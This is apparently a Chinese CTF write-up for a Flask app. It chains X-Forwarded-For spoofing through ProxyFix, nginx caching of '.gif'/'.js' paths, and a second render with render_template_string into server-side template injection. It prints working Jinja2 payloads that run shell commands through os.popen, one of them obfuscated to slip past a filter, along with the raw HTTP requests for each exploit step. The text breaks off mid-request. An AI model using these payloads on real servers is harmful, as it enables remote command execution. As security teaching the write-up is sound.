<span class="token keyword">import</span> random
<span class="token keyword">import</span> string
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token punctuation">(</span>
    Flask<span class="token punctuation">,</span>
    render_template<span class="token punctuation">,</span>
    request<span class="token punctuation">,</span>
    redirect<span class="token punctuation">,</span>
    url_for<span class="token punctuation">,</span>
    render_template_string<span class="token punctuation">,</span>
<span class="token punctuation">)</span>
<span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemy
<span class="token keyword">from</span> flask_login <span class="token keyword">import</span> <span class="token punctuation">(</span>
    LoginManager<span class="token punctuation">,</span>
    UserMixin<span class="token punctuation">,</span>
    login_user<span class="token punctuation">,</span>
    login_required<span class="token punctuation">,</span>
    logout_user<span class="token punctuation">,</span>
    current_user<span class="token punctuation">,</span>
<span class="token punctuation">)</span>
<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> DeclarativeBase
<span class="token keyword">from</span> sqlalchemy<span class="token punctuation">.</span>orm <span class="token keyword">import</span> Mapped<span class="token punctuation">,</span> mapped_column
<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>security <span class="token keyword">import</span> generate_password_hash<span class="token punctuation">,</span> check_password_hash
<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>middleware<span class="token punctuation">.</span>proxy_fix <span class="token keyword">import</span> ProxyFix
<span class="token keyword">import</span> geoip2<span class="token punctuation">.</span>database


<span class="token keyword">class</span> <span class="token class-name">Base</span><span class="token punctuation">(</span>DeclarativeBase<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>


db <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span>model_class<span class="token operator">=</span>Base<span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">,</span> UserMixin<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">id</span><span class="token punctuation">:</span> Mapped<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token operator">=</span> mapped_column<span class="token punctuation">(</span>primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    username<span class="token punctuation">:</span> Mapped<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> mapped_column<span class="token punctuation">(</span>unique<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    password<span class="token punctuation">:</span> Mapped<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> mapped_column<span class="token punctuation">(</span><span class="token punctuation">)</span>
    bio<span class="token punctuation">:</span> Mapped<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> mapped_column<span class="token punctuation">(</span><span class="token punctuation">)</span>
    last_ip<span class="token punctuation">:</span> Mapped<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> mapped_column<span class="token punctuation">(</span>nullable<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">set_password</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>password <span class="token operator">=</span> generate_password_hash<span class="token punctuation">(</span>password<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">check_password</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> check_password_hash<span class="token punctuation">(</span>self<span class="token punctuation">.</span>password<span class="token punctuation">,</span> password<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"&lt;User %r&gt;"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>name


app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"SQLALCHEMY_DATABASE_URI"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"sqlite:///data.db"</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">"SECRET_KEY"</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>wsgi_app <span class="token operator">=</span> ProxyFix<span class="token punctuation">(</span>app<span class="token punctuation">.</span>wsgi_app<span class="token punctuation">)</span>

db<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span>
<span class="token keyword">with</span> app<span class="token punctuation">.</span>app_context<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    db<span class="token punctuation">.</span>create_all<span class="token punctuation">(</span><span class="token punctuation">)</span>

login_manager <span class="token operator">=</span> LoginManager<span class="token punctuation">(</span>app<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">gen_random_string</span><span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters<span class="token punctuation">,</span> k<span class="token operator">=</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@login_manager<span class="token punctuation">.</span>user_loader</span>
<span class="token keyword">def</span> <span class="token function">load_user</span><span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">:</span>
    user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>user_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> user


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">route_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> <span class="token keyword">not</span> password<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"Invalid username or password."</span>
        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> user <span class="token keyword">and</span> user<span class="token punctuation">.</span>check_password<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>
            login_user<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"route_profile"</span><span class="token punctuation">,</span> username<span class="token operator">=</span>user<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"Invalid username or password."</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"login.html"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/logout"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@login_required</span>
<span class="token keyword">def</span> <span class="token function">route_logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    logout_user<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/register"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">route_register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span>
        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span>
        bio <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"bio"</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> username <span class="token keyword">or</span> <span class="token keyword">not</span> password<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"Invalid username or password."</span>
        user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> user<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"Username already exists."</span>
        user <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">,</span> bio<span class="token operator">=</span>bio<span class="token punctuation">)</span>
        user<span class="token punctuation">.</span>set_password<span class="token punctuation">(</span>password<span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"route_login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"register.html"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/&lt;string:username&gt;"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">route_profile</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"profile.html"</span><span class="token punctuation">,</span> user<span class="token operator">=</span>user<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/get_last_ip/&lt;string:username&gt;"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">route_check_ip</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"You need to login first."</span>
    user <span class="token operator">=</span> User<span class="token punctuation">.</span>query<span class="token punctuation">.</span>filter_by<span class="token punctuation">(</span>username<span class="token operator">=</span>username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> user<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"User not found."</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"last_ip.html"</span><span class="token punctuation">,</span> last_ip<span class="token operator">=</span>user<span class="token punctuation">.</span>last_ip<span class="token punctuation">)</span>

geoip2_reader <span class="token operator">=</span> geoip2<span class="token punctuation">.</span>database<span class="token punctuation">.</span>Reader<span class="token punctuation">(</span><span class="token string">"GeoLite2-Country.mmdb"</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/ip_detail/&lt;string:username&gt;"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">route_ip_detail</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://127.0.0.1/get_last_ip/</span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Get last ip failed."</span>
    last_ip <span class="token operator">=</span> res<span class="token punctuation">.</span>text
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        ip <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"\d+\.\d+\.\d+\.\d+"</span><span class="token punctuation">,</span> last_ip<span class="token punctuation">)</span>
        country <span class="token operator">=</span> geoip2_reader<span class="token punctuation">.</span>country<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
    <span class="token keyword">except</span> <span class="token punctuation">(</span>ValueError<span class="token punctuation">,</span> TypeError<span class="token punctuation">)</span><span class="token punctuation">:</span>
        country <span class="token operator">=</span> <span class="token string">"Unknown"</span>
    template <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
    &lt;h1&gt;IP Detail&lt;/h1&gt;
    &lt;div&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>last_ip<span class="token punctuation">}</span></span><span class="token string">&lt;/div&gt;
    &lt;p&gt;Country:</span><span class="token interpolation"><span class="token punctuation">{</span>country<span class="token punctuation">}</span></span><span class="token string">&lt;/p&gt;
    """</span></span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span>
<span class="token keyword">def</span> <span class="token function">set_last_ip</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>
        current_user<span class="token punctuation">.</span>last_ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> response


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此路由二次渲染last_ip,如果last_ip可控会造成模板注入</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/ip_detail/&lt;string:username&gt;"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">route_ip_detail</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://127.0.0.1/get_last_ip/</span><span class="token interpolation"><span class="token punctuation">{</span>username<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> res<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Get last ip failed."</span>
    last_ip <span class="token operator">=</span> res<span class="token punctuation">.</span>text
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        ip <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"\d+\.\d+\.\d+\.\d+"</span><span class="token punctuation">,</span> last_ip<span class="token punctuation">)</span>
        country <span class="token operator">=</span> geoip2_reader<span class="token punctuation">.</span>country<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
    <span class="token keyword">except</span> <span class="token punctuation">(</span>ValueError<span class="token punctuation">,</span> TypeError<span class="token punctuation">)</span><span class="token punctuation">:</span>
        country <span class="token operator">=</span> <span class="token string">"Unknown"</span>
    template <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""
    &lt;h1&gt;IP Detail&lt;/h1&gt;
    &lt;div&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>last_ip<span class="token punctuation">}</span></span><span class="token string">&lt;/div&gt;
    &lt;p&gt;Country:</span><span class="token interpolation"><span class="token punctuation">{</span>country<span class="token punctuation">}</span></span><span class="token string">&lt;/p&gt;
    """</span></span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>应用使用了ProxyFix中间件</p>
<pre class="line-numbers language-none"><code class="language-none">from werkzeug.middleware.proxy_fix import ProxyFix
app.wsgi_app = ProxyFix(app.wsgi_app)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ProxyFix中间件的作用是从代理服务器传递的请求头中获取客户端的真实IP地址。当请求经过代理（如Nginx）时，原始客户端的IP会被保存在X-Forwarded-For头中。通过设置ProxyFix中间件，Flask的request.remote_addr将不再使用直接连接的客户端IP（通常是代理服务器的IP），而是使用X-Forwarded-For请求头中的IP地址。</p>
<pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: 127.0.0.1 {%set ca=e|slice(16)|string|batch(16)|first|last+e|slice(7)|string|batch(7)|first|last+e|slice(8)|string|batch(8)|first|last+e|slice(11)|string|batch(11)|first|last+cycler.__doc__[697]+e|pprint|lower|batch(5)|first|last+e|slice(28)|string|batch(28)|first|last+e|slice(7)|string|batch(7)|first|last+e|slice(2)|string|batch(2)|first|last%}{{(sbwaf.__eq__.__globals__.sys.modules.os.popen(ca)).read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>配置文件中有如下内容</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">location</span> ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$</span> <span class="token punctuation">{</span>
    <span class="token directive"><span class="token keyword">proxy_ignore_headers</span> Cache-Control Expires Vary Set-Cookie</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">proxy_pass</span> http://127.0.0.1:5000</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">proxy_cache</span> static</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">proxy_cache_valid</span> <span class="token number">200</span> <span class="token number">302</span> <span class="token number">30d</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token directive"><span class="token keyword">location</span> ~ .*\.(js|css)?$</span> <span class="token punctuation">{</span>
    <span class="token directive"><span class="token keyword">proxy_ignore_headers</span> Cache-Control Expires Vary Set-Cookie</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">proxy_pass</span> http://127.0.0.1:5000</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">proxy_cache</span> static</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">proxy_cache_valid</span> <span class="token number">200</span> <span class="token number">302</span> <span class="token number">12h</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>current_user.last_ip = request.remote_addr</code>于是要记得访问”<code>/xxx.js</code>“</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span>
<span class="token keyword">def</span> <span class="token function">set_last_ip</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 检查用户是否已登录（通过 Flask-Login 的 current_user 实现）</span>
    <span class="token keyword">if</span> current_user<span class="token punctuation">.</span>is_authenticated<span class="token punctuation">:</span>
        <span class="token comment"># 将当前请求的客户端 IP 记录为用户的 last_ip</span>
        current_user<span class="token punctuation">.</span>last_ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr
        <span class="token comment"># 提交数据库会话，保存修改</span>
        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 返回响应（不改变原始响应内容）</span>
    <span class="token keyword">return</span> response<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>服务器设置了缓存所有以.js结尾的响应,同时注册功能没有限制用户名中的特殊字符,这使得我们可以构造特殊的用户名,例如:username.js。当我们注册完成后先向<code>/</code>发送带有<code>X-Forwarded-For:xxx</code>的请求，再向<code>/get_last_ip/username.js</code>发送请求,服务器返回的响应会被缓存,无论接下来的请求是否携带cookie,只要路径相同,返回的结果都会是相同的。<code>/ip_detail</code>路由内部向<code>/get_last_ip</code>发送的请求即使不携带cookie也会返回我们给予的last_ip。</p>
<pre class="line-numbers language-none"><code class="language-none">X-Forwarded-For: {{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}

X-Forwarded-For: {{ config.__class__.__init__.__globals__[request.args.os].popen(request.args.a).read() }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>五步走</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f05e6840ae1351ea961854c6b302706b.png"></p>
<pre class="line-numbers language-none"><code class="language-none">1、
POST /register HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 50
Cache-Control: max-age=0
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8081
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8081/register
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJwljjEOAjEMBP_imsJO7MS5zyDHsQUS1Z2oEH8nEsU2u7PSfOCeZ1wPONJeV9zg_lxwgDsqE7P5dJlEiJ5O04tkzbYjYtNKtuWqWpBMBorVFsYx2mDBhYu7UlJ4MO3XzBDtuos9CK2hSLP3rIQlzZEEN4EpdTBskfcV599G4fsDIoovpA.aHXdQg.gjgdpHxTZo4pCAURSMOuKxTS8uA
Connection: keep-alive

username=user14.gif&amp;password=1&amp;bio=1&amp;submit=Sign+Up




2、
POST /login HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 39
X-Forwarded-For: {{ config.__class__.__init__.__globals__[request.args.os].popen(request.args.a).read() }}
Cache-Control: max-age=0
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8081
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8081/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=user14.gif&amp;password=1&amp;submit=Log+In




3、(没有也行)
GET /user14.gif HTTP/1.1
Host: 127.0.0.1:8081
X-Forwarded-For: {{ config.__class__.__init__.__globals__[request.args.os].popen(request.args.a).read() }}
Cookie:{{Cookie}}
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive



4、（检查）
GET /get_last_ip/user14.gif HTTP/1.1
Host: 127.0.0.1:8081
X-Forwarded-For: {{ config.__class__.__init__.__globals__[request.args.os].popen(request.args.a).read() }}
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36
